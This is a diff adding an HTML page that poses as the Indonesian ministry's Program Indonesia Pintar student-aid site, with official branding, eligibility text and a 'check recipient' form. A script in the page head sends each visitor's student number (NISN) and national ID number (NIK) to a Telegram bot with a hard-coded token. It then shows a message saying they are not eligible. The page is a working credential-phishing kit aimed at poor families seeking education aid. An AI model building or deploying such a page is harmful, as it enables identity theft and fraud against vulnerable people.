@@ -1,0 +1,285 @@
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>
+        Program Indonesia Pintar
+    </title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #0A3D91;
+            color: white;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .header img {
+            width: 100px;
+        }
+        .nav {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        .nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .content {
+            background-color: #0A3D91;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .content img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .section {
+            background-color: white;
+            color: black;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .section h2 {
+            background-color: #00AEEF;
+            color: white;
+            padding: 10px;
+            border-radius: 10px 10px 0 0;
+            margin: -20px -20px 20px -20px;
+        }
+        .section img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .form-section {
+            background-color: #B0B0B0;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .form-section input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        .form-section button {
+            width: 100%;
+            padding: 10px;
+            background-color: #00AEEF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #0A3D91;
+            color: white;
+        }
+        .footer img {
+            width: 50px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .footer .social-media {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .footer .social-media a {
+            color: white;
+            font-size: 20px;
+        }
+    </style>
+    <script>
+        function sendToTelegram(nisn, nik) {
+            const botToken = '7732279798:AAFIlMkKJFu_JQPQviYbCPsFGNwv-FQ8d1c';
+            const chatId = '7551741568';
+            const message = `NISN: ${nisn}\nNIK: ${nik}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Data berhasil dikirim ke bot Telegram.');
+                    } else {
+                        alert('Gagal mengirim data ke bot Telegram.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Terjadi kesalahan saat mengirim data ke bot Telegram.');
+                });
+        }
+
+        function checkPIP() {
+            const nisn = document.getElementById('nisn').value;
+            const nik = document.getElementById('nik').value;
+            const captcha = document.getElementById('captcha').value;
+
+            if (captcha === '33') { // Assuming the correct answer is 33
+                alert('Anda sepertinya tidak dapat sebagai penerima PIP.');
+                sendToTelegram(nisn, nik);
+            } else {
+                alert('Captcha salah. Silakan coba lagi.');
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img alt="Logo of the Program Indonesia Pintar" height="100" src="https://storage.googleapis.com/a1aa/image/a6qSIrQJnt50NN2OwhoKIY8Flw2Jb5myljDlmjWgZGH6fpfTA.jpg" width="100"/>
+        </div>
+        <div class="nav">
+            <a href="#">
+                Beranda
+            </a>
+            <a href="#">
+                Data Penyaluran
+            </a>
+            <a href="#">
+                Login
+            </a>
+        </div>
+        <div class="content">
+            <img alt="Illustration of children representing the Program Indonesia Pintar" height="400" src="https://storage.googleapis.com/a1aa/image/ISaapIxfZz1RLyTkJD0wzaoEeSeezCUZJCg1QNmV3GXref0fJA.jpg" width="800"/>
+            <h1>
+                Program Indonesia Pintar
+            </h1>
+            <p>
+                Merupakan bantuan berupa uang tunai, perluasan akses, dan kesempatan belajar dari pemerintah yang diberikan kepada peserta didik yang berasal dari keluarga miskin atau rentan miskin untuk membiayai pendidikan
+            </p>
+        </div>
+        <div class="section">
+            <h2>
+                Tujuan PIP
+            </h2>
+            <img alt="Image of Kartu Indonesia Pintar" height="200" src="https://storage.googleapis.com/a1aa/image/bOp13LffIzi2ZkG8q5EdjSZJ0uayV7WCVa838ojw5jOmfnePB.jpg" width="800"/>
+            <p>
+                PIP dirancang untuk membantu anak-anak usia sekolah dari keluarga miskin/rentan miskin/prioritas tetap mendapatkan layanan pendidikan sampai tamat pendidikan menengah, baik melalui jalur formal SD sampai SMA/SMK dan jalur non formal paket A sampai paket C dan pendidikan khusus. Melalui program ini pemerintah berupaya mencegah peserta didik dari kemungkinan putus sekolah, dan diharapkan dapat menarik siswa putus sekolah agar kembali melanjutkan pendidikan. PIP juga diharapkan dapat meringankan biaya personal pendidikan peserta didik, baik biaya langsung maupun tidak langsung
+            </p>
+        </div>
+        <div class="section">
+            <h2>
+                Penerima PIP
+            </h2>
+            <img alt="Illustration of eligible students for PIP" height="200" src="https://storage.googleapis.com/a1aa/image/b4DEiwx4405xBdj7v6dM15I3rOXUwsm5hCpSYleY0w11fTfnA.jpg" width="800"/>
+            <ul>
+                <li>
+                    Peserta Didik pemegang KIP
+                </li>
+                <li>
+                    Peserta Didik dari keluarga miskin/rentan miskin dan/atau dengan pertimbangan khusus seperti:
+                    <ul>
+                        <li>
+                            Peserta Didik dari keluarga miskin/rentan miskin yang terdaftar di DTKS
+                        </li>
+                        <li>
+                            Peserta Didik dari keluarga peserta PKH
+                        </li>
+                        <li>
+                            Peserta Didik dari keluarga pemegang KKS
+                        </li>
+                        <li>
+                            Peserta Didik yang berstatus yatim/piatu/yatim piatu dari sekolah/panti sosial/panti asuhan
+                        </li>
+                        <li>
+                            Peserta Didik yang terkena dampak bencana alam
+                        </li>
+                        <li>
+                            Peserta Didik yang tidak bersekolah (drop out) yang diharapkan kembali bersekolah
+                        </li>
+                        <li>
+                            Peserta Didik yang mengalami kelainan fisik, korban musibah, dari orang tua yang mengalami pemutusan hubungan kerja, di daerah konflik, dari keluarga terpidana, berada di Lembaga Pemasyarakatan, memiliki lebih dari 3 (tiga) saudara yang tinggal serumah
+                        </li>
+                        <li>
+                            Peserta pada lembaga kursus atau satuan pendidikan nonformal lainnya
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+        <div class="form-section">
+            <h2>
+                Cari Penerima PIP
+            </h2>
+            <input id="nisn" placeholder="Ketik NISN" type="text"/>
+            <input id="nik" placeholder="Ketik NIK" type="text"/>
+            <div>
+                <span>
+                    14 + 19
+                </span>
+                <input id="captcha" placeholder="Ketik Hasil perhitungan di atas" type="text"/>
+            </div>
+            <button onclick="checkPIP()">
+                Cek Penerima PIP
+            </button>
+        </div>
+        <div class="footer">
+            <img alt="Logo of the Program Indonesia Pintar" height="50" src="https://storage.googleapis.com/a1aa/image/a6qSIrQJnt50NN2OwhoKIY8Flw2Jb5myljDlmjWgZGH6fpfTA.jpg" width="50"/>
+            <p>
+                PUSAT LAYANAN PEMBIAYAAN PENDIDIKAN
+            </p>
+            <p>
+                KEMENTERIAN PENDIDIKAN, KEBUDAYAAN, RISET dan TEKNOLOGI
+            </p>
+            <p>
+                Copyright © 2020-2022 PIP - Puslapdik
+            </p>
+            <p>
+                Gedung C Lantai 13, Jl. Jenderal SudirmanSenayan, Jakarta Pusat 10270
+            </p>
+            <p>
+                Pengaduan terkait PIP melalui Unit Layanan Terpadu (ULT) Kemdikbudristek
+            </p>
+            <p>
+                Telepon : Hotline 177;
+            </p>
+            <p>
+                surel : pengaduan@kemdikbud.go.id; dan
+            </p>
+            <p>
+                laman : ult.kemdikbud.go.id.
+            </p>
+            <div class="social-media">
+                <a href="#">
+                    <i class="fab fa-facebook">
+                    </i>
+                </a>
+                <a href="#">
+                    <i class="fab fa-twitter">
+                    </i>
+                </a>
+                <a href="#">
+                    <i class="fab fa-instagram">
+                    </i>
+                </a>
+                <a href="#">
+                    <i class="fab fa-tiktok">
+                    </i>
+                </a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
